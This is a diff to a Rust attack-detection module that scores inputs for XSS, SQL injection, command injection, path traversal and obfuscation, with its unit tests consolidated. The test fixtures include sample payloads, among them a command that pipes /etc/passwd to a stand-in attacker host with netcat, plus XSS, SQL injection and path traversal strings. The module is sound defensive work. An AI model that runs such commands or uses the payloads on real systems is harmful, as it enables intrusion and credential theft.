@@ -3,9 +3,6 @@ use std::sync::LazyLock;
 
 use regex::Regex;
 
-use crate::util::ceil_boundary;
-use crate::util::floor_boundary;
-
 mod keywords;
 mod patterns;
 
@@ -21,35 +18,46 @@ static INJECTION_KEYWORDS: &[&str] =
     &["eval", "exec", "compile", "__import__", "globals", "locals"];
 
 // token extraction
-static WORD_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b\w+\b").unwrap());
+static WORD_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b\w+\b").expect("static regex"));
 
 // encoding layer detection
-static URL_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"%[0-9a-fA-F]{2}").unwrap());
-static B64_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{4,}={0,2}").unwrap());
-static HEX_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?:0x)?[0-9a-fA-F]{4,}").unwrap());
-static UNICODE_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\\u[0-9a-fA-F]{4}").unwrap());
-static HTML_ENT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"&[#\w]+;").unwrap());
+static URL_ENC: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"%[0-9a-fA-F]{2}").expect("static regex"));
+static B64_ENC: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{4,}={0,2}").expect("static regex"));
+static HEX_ENC: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?:0x)?[0-9a-fA-F]{4,}").expect("static regex"));
+static UNICODE_ENC: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\\u[0-9a-fA-F]{4}").expect("static regex"));
+static HTML_ENT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"&[#\w]+;").expect("static regex"));
 
 // structural boost patterns
 static SQL_STRUCT: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)\b(?:union|select|from|where)\b").unwrap());
-static XSS_STRUCT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"<[^>]+>").unwrap());
-static CMD_STRUCT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[;&|]").unwrap());
-static PATH_STRUCT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\.{2,}[/\\]").unwrap());
+    LazyLock::new(|| Regex::new(r"(?i)\b(?:union|select|from|where)\b").expect("static regex"));
+static XSS_STRUCT: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"<[^>]+>").expect("static regex"));
+static CMD_STRUCT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[;&|]").expect("static regex"));
+static PATH_STRUCT: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\.{2,}[/\\]").expect("static regex"));
 
 // obfuscation detection
-static SPECIAL_CHAR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[^a-zA-Z0-9\s]").unwrap());
-static LONG_RUN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\S{100,}").unwrap());
+static SPECIAL_CHAR: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[^a-zA-Z0-9\s]").expect("static regex"));
+static LONG_RUN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\S{100,}").expect("static regex"));
 
 // code injection risk
-static BRACES: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[\{\}].*[\{\}]").unwrap());
-static FUNC_CALL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\w+\s*\([^)]*\)").unwrap());
-static DOLLAR_VAR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[$@]\w+").unwrap());
-static OPERATORS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[=+\-*/]{2,}").unwrap());
+static BRACES: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[\{\}].*[\{\}]").expect("static regex"));
+static FUNC_CALL: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\w+\s*\([^)]*\)").expect("static regex"));
+static DOLLAR_VAR: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[$@]\w+").expect("static regex"));
+static OPERATORS: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[=+\-*/]{2,}").expect("static regex"));
 static INJECTION_KW_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
     INJECTION_KEYWORDS
         .iter()
-        .filter_map(|kw| Regex::new(&format!(r"(?i)\b{kw}\b")).ok())
+        .map(|kw| Regex::new(&format!(r"(?i)\b{kw}\b")).expect("static keyword regex"))
         .collect()
 });
 
@@ -80,12 +88,7 @@ pub struct AnalysisResult {
 #[doc(hidden)]
 pub fn extract_tokens(content: &str, structures: &AttackStructures) -> Vec<String> {
     let content = if content.len() > MAX_CONTENT_LENGTH {
-        // truncate at char boundary
-        let mut end = MAX_CONTENT_LENGTH;
-        while end > 0 && !content.is_char_boundary(end) {
-            end -= 1;
-        }
-        &content[..end]
+        &content[..content.floor_char_boundary(MAX_CONTENT_LENGTH)]
     } else {
         content
     };
@@ -120,12 +123,7 @@ pub fn calculate_entropy(content: &str) -> f64 {
     }
 
     let content = if content.len() > MAX_ENTROPY_LENGTH {
-        // truncate at char boundary to keep substring valid UTF-8
-        let mut end = MAX_ENTROPY_LENGTH;
-        while end > 0 && !content.is_char_boundary(end) {
-            end -= 1;
-        }
-        &content[..end]
+        &content[..content.floor_char_boundary(MAX_ENTROPY_LENGTH)]
     } else {
         content
     };
@@ -151,7 +149,7 @@ pub fn calculate_entropy(content: &str) -> f64 {
 #[must_use]
 pub fn detect_encoding_layers(content: &str) -> u32 {
     let content = if content.len() > MAX_SCAN_LENGTH {
-        &content[..MAX_SCAN_LENGTH]
+        &content[..content.floor_char_boundary(MAX_SCAN_LENGTH)]
     } else {
         content
     };
@@ -195,8 +193,8 @@ pub fn extract_suspicious_patterns(
         .iter()
         .flat_map(|&(name, ref re)| {
             re.find_iter(content).map(move |m| {
-                let ctx_start = floor_boundary(content, m.start().saturating_sub(20));
-                let ctx_end = ceil_boundary(content, m.end() + 20);
+                let ctx_start = content.floor_char_boundary(m.start().saturating_sub(20));
+                let ctx_end = content.ceil_char_boundary(m.end() + 20);
 
                 SuspiciousPattern {
                     pattern_type: name,
@@ -310,7 +308,7 @@ fn obfuscation_with_inputs(content: &str, entropy: f64, encoding_layers: u32) ->
         || encoding_layers > 2
         || {
             let special_count = SPECIAL_CHAR.find_iter(content).count();
-            special_count as f64 / content.len().max(1) as f64 > 0.4
+            special_count as f64 / content.chars().count().max(1) as f64 > 0.4
         }
         || LONG_RUN.is_match(content)
 }
@@ -366,94 +364,109 @@ mod tests {
     }
 
     #[test]
-    fn entropy_empty() {
+    fn entropy() {
         assert!(calculate_entropy("").abs() < f64::EPSILON);
+        assert!(calculate_entropy(&"abcdefghij".repeat(200)) > 3.0);
     }
 
     #[test]
-    fn entropy_uniform() {
-        let s = "abcdefghij".repeat(200);
-        let e = calculate_entropy(&s);
-        assert!(e > 3.0);
-    }
-
-    #[test]
-    fn encoding_layers_url() {
+    fn encoding_layers() {
         assert!(detect_encoding_layers("%3Cscript%3E") >= 1);
+        assert!(detect_encoding_layers("normal text &lt;script&gt;alert(1)&lt;/script&gt;") >= 1);
+        // multiple layer types
+        assert!(detect_encoding_layers("%3C &lt; \\u003C 0x3C3C AAAA==") >= 3);
+
+        // combined layers also trigger obfuscation
+        let content = "%3Cscript%3E&lt;test&gt;\\u0041\\u0042";
+        assert!(detect_encoding_layers(content) > 2);
+        assert!(detect_obfuscation(content));
+
+        // max scan length must not panic on large input
+        let content = format!("{}{}", "normal text ".repeat(1000), "%3Cscript%3E");
+        let _ = detect_encoding_layers(&content);
+        // regression: 3-byte char (hiragana) so MAX_SCAN_LENGTH lands mid-codepoint
+        let _ = detect_encoding_layers(&"\u{3042}".repeat(4000));
     }
 
     #[test]
-    fn encoding_layers_multiple() {
-        let content = "%3C &lt; \\u003C 0x3C3C AAAA==";
-        assert!(detect_encoding_layers(content) >= 3);
-    }
-
-    #[test]
-    fn xss_detection() {
+    fn attack_probability_detection() {
         let probs = analyze_attack_probability("<img src=x onerror=alert(1)>", &kw(), &st());
         assert!(probs["xss"] > 0.3);
-    }
 
-    #[test]
-    fn sql_injection_detection() {
         let probs =
             analyze_attack_probability("1' OR '1'='1' UNION SELECT * FROM users--", &kw(), &st());
         assert!(probs["sql"] > 0.3);
-    }
 
-    #[test]
-    fn command_injection_detection() {
-        let probs = analyze_attack_probability(
-            "test; cat /etc/passwd | nc attacker.com 9999",
-            &kw(),
-            &st(),
+        // mixed case
+        assert!(
+            analyze_attack_probability("SeLeCt * FrOm UsErS UnIoN sElEcT", &kw(), &st())["sql"]
+                > 0.0
         );
-        assert!(probs["command"] > 0.3);
+        // command
+        assert!(
+            analyze_attack_probability(
+                "test; cat /etc/passwd | nc attacker.com 9999",
+                &kw(),
+                &st()
+            )["command"]
+                > 0.3
+        );
+        assert!(
+            analyze_attack_probability("exec command; cat /etc/passwd | grep root", &kw(), &st())["command"]
+                > 0.3
+        );
+        // path
+        assert!(analyze_attack_probability("../../etc/passwd", &kw(), &st())["path"] > 0.3);
+        // unicode content
+        assert!(
+            analyze_attack_probability(
+                "测试 <script>alert('χαίρετε')</script> اختبار",
+                &kw(),
+                &st()
+            )["xss"]
+                > 0.0
+        );
     }
 
     #[test]
-    fn path_traversal_detection() {
-        let probs = analyze_attack_probability("../../etc/passwd", &kw(), &st());
-        assert!(probs["path"] > 0.3);
-    }
-
-    #[test]
-    fn obfuscation_high_entropy() {
+    fn obfuscation_detection() {
+        // high entropy
         let content: String = (0u32..100)
             .map(|i| char::from(b'!' + ((i * 7 + 13) % 94) as u8))
             .collect();
         assert!(detect_obfuscation(&content));
+
+        // special char ratio
+        assert!(detect_obfuscation(
+            &("!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`".to_owned().repeat(3) + "normal")
+        ));
+        // long unbroken run
+        assert!(detect_obfuscation(&"a".repeat(150)));
     }
 
     #[test]
-    fn obfuscation_special_chars() {
-        let content = "!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`".repeat(3) + "normal";
-        assert!(detect_obfuscation(&content));
-    }
-
-    #[test]
-    fn code_injection_risk_brackets() {
+    fn code_injection_risk() {
         assert!(analyze_code_injection_risk("{malicious} code {injection}") >= 0.2);
-    }
-
-    #[test]
-    fn code_injection_risk_keywords() {
         assert!(analyze_code_injection_risk("eval(user_input) and exec(command)") >= 0.4);
+        assert!(analyze_code_injection_risk("$variable @another_var ${complex}") >= 0.1);
     }
 
     #[test]
-    fn full_analysis_xss_sqli() {
+    fn full_analysis_and_threat_score() {
         let content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users";
         let result = analyze(content, &kw(), &st());
-
         assert!(result.attack_probabilities["xss"] > 0.0);
         assert!(result.attack_probabilities["sql"] > 0.0);
+        assert!(result.attack_probabilities.contains_key("command"));
+        assert!(result.entropy > 0.0);
         assert!(result.token_count > 0);
-    }
 
-    #[test]
-    fn threat_score_high() {
-        let result = AnalysisResult {
+        // threat score is bounded and non-trivial for this input
+        let score = get_threat_score(&result);
+        assert!((0.0..=1.0).contains(&score));
+
+        // explicit high-score result
+        let high = AnalysisResult {
             attack_probabilities: HashMap::from([("xss", 0.8), ("sql", 0.6)]),
             entropy: 5.0,
             encoding_layers: 2,
@@ -475,15 +488,10 @@ mod tests {
             code_injection_risk: 0.5,
             token_count: 10,
         };
+        assert!(get_threat_score(&high) > 0.5);
 
-        let score = get_threat_score(&result);
-        assert!(score > 0.5);
-        assert!(score <= 1.0);
-    }
-
-    #[test]
-    fn threat_score_zero() {
-        let result = AnalysisResult {
+        // zero result scores zero
+        let zero = AnalysisResult {
             attack_probabilities: HashMap::new(),
             entropy: 0.0,
             encoding_layers: 0,
@@ -492,43 +500,40 @@ mod tests {
             code_injection_risk: 0.0,
             token_count: 0,
         };
-        assert!(get_threat_score(&result).abs() < f64::EPSILON);
+        assert!(get_threat_score(&zero).abs() < f64::EPSILON);
     }
 
     #[test]
-    fn extract_tokens_respects_limits() {
-        let content = "a ".repeat(30000);
-        let tokens = extract_tokens(&content, &st());
+    fn keywords_initialized() {
+        let keywords = kw();
+        let all = keywords.all();
+        assert!(all["xss"].contains("script"));
+        assert!(all["sql"].contains("select"));
+        assert!(all["command"].contains("exec"));
+
+        for key in ["xss", "sql", "command", "path", "template"] {
+            assert!(all.contains_key(key));
+        }
+        assert!(analyze_attack_probability("test content", &kw(), &st())["template"] < 0.5);
+    }
+
+    #[test]
+    fn extract_tokens_limits() {
+        let tokens = extract_tokens(&"a ".repeat(30000), &st());
         assert!(tokens.len() <= MAX_TOKENS);
     }
 
     #[test]
-    fn suspicious_patterns_found() {
+    fn suspicious_patterns() {
         let content = "normal <script>alert(1)</script> text with function() call";
         let patterns = extract_suspicious_patterns(content, &st());
         assert!(!patterns.is_empty());
         assert!(patterns.iter().any(|p| p.pattern_type == "tag_like"));
-    }
-
-    #[test]
-    fn mixed_case_sql_keywords() {
-        let probs = analyze_attack_probability("SeLeCt * FrOm UsErS UnIoN sElEcT", &kw(), &st());
-        assert!(probs["sql"] > 0.0);
-    }
-
-    #[test]
-    fn unicode_content() {
-        let probs = analyze_attack_probability(
-            "测试 <script>alert('χαίρετε')</script> اختبار",
-            &kw(),
-            &st(),
-        );
-        assert!(probs["xss"] > 0.0);
-    }
-
-    #[test]
-    fn long_string_obfuscation() {
-        assert!(detect_obfuscation(&"a".repeat(150)));
+        for p in &patterns {
+            assert!(!p.pattern_type.is_empty());
+            assert!(!p.matched.is_empty());
+            assert!(!p.context.is_empty());
+        }
     }
 
     #[test]
@@ -542,74 +547,6 @@ mod tests {
     }
 
     #[test]
-    fn keywords_initialized() {
-        let keywords = kw();
-        let all = keywords.all();
-        assert!(all.contains_key("xss"));
-        assert!(all.contains_key("sql"));
-        assert!(all.contains_key("command"));
-        assert!(all.contains_key("path"));
-        assert!(all.contains_key("template"));
-        assert!(all["xss"].contains("script"));
-        assert!(all["sql"].contains("select"));
-        assert!(all["command"].contains("exec"));
-    }
-
-    #[test]
-    fn empty_keywords_zero_score() {
-        let probs = analyze_attack_probability("test content", &kw(), &st());
-        assert!(probs["template"] < 0.5);
-    }
-
-    #[test]
-    fn command_pattern_with_pipe() {
-        let probs =
-            analyze_attack_probability("exec command; cat /etc/passwd | grep root", &kw(), &st());
-        assert!(probs["command"] > 0.3);
-    }
-
-    #[test]
-    fn encoding_layers_html_entities() {
-        let content = "normal text &lt;script&gt;alert(1)&lt;/script&gt;";
-        assert!(detect_encoding_layers(content) >= 1);
-    }
-
-    #[test]
-    fn encoding_layers_max_scan_length() {
-        let content = format!("{}{}", "normal text ".repeat(1000), "%3Cscript%3E");
-        let _ = detect_encoding_layers(&content);
-    }
-
-    #[test]
-    fn comprehensive_analyze_keys() {
-        let content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users";
-        let result = analyze(content, &kw(), &st());
-        assert!(result.attack_probabilities.contains_key("xss"));
-        assert!(result.attack_probabilities.contains_key("sql"));
-        assert!(result.entropy > 0.0);
-        assert!(result.token_count > 0);
-    }
-
-    #[test]
-    fn threat_score_bounded() {
-        let content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users";
-        let result = analyze(content, &kw(), &st());
-        let score = get_threat_score(&result);
-        assert!((0.0..=1.0).contains(&score));
-    }
-
-    #[test]
-    fn suspicious_pattern_has_context() {
-        let content = "normal <script>alert(1)</script> text with function() call";
-        let patterns = extract_suspicious_patterns(content, &st());
-        for p in &patterns {
-            assert!(!p.pattern_type.is_empty());
-            assert!(!p.matched.is_empty());
-            assert!(!p.context.is_empty());
-        }
-    }
-
-    #[test]
     fn obfuscated_base64() {
         let result = analyze("PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", &kw(), &st());
         assert!(result.is_obfuscated);
@@ -617,44 +554,24 @@ mod tests {
     }
 
     #[test]
-    fn code_injection_risk_variables() {
-        assert!(analyze_code_injection_risk("$variable @another_var ${complex}") >= 0.1);
-    }
-
-    #[test]
     fn performance_large_input() {
         let content = format!("{}<script>alert(1)</script>", "normal text ".repeat(10000));
         let start = std::time::Instant::now();
         let result = analyze(&content, &kw(), &st());
-        let duration = start.elapsed();
-        assert!(duration.as_secs_f64() < 1.0);
+        assert!(start.elapsed().as_secs_f64() < 1.0);
         assert!(result.token_count <= MAX_TOKENS);
     }
 
+    // regression: emoji padding so context window (±20 bytes) lands mid-codepoint
     #[test]
-    fn multiple_encoding_layers_detected() {
-        let content = "%3Cscript%3E&lt;test&gt;\\u0041\\u0042";
-        let layers = detect_encoding_layers(content);
-        assert!(layers > 2);
-        assert!(detect_obfuscation(content));
-    }
-
-    #[test]
-    fn extract_suspicious_patterns_multibyte_no_panic() {
-        // emoji on each side of <script> so context window (±20) lands mid-codepoint
-        let pad = "\u{1F600}".repeat(8); // 32 bytes
+    fn multibyte_no_panic() {
+        let pad = "\u{1F600}".repeat(8);
         let content = format!("{pad}<script>alert(1)</script>{pad}");
         let patterns = extract_suspicious_patterns(&content, &st());
         for p in &patterns {
             assert!(content.is_char_boundary(p.position));
         }
         assert!(!patterns.is_empty());
-    }
-
-    #[test]
-    fn analyze_multibyte_no_panic() {
-        let pad = "\u{1F600}".repeat(8);
-        let content = format!("{pad}<script>alert(1)</script>{pad}");
         let result = analyze(&content, &kw(), &st());
         assert!(result.token_count > 0);
     }
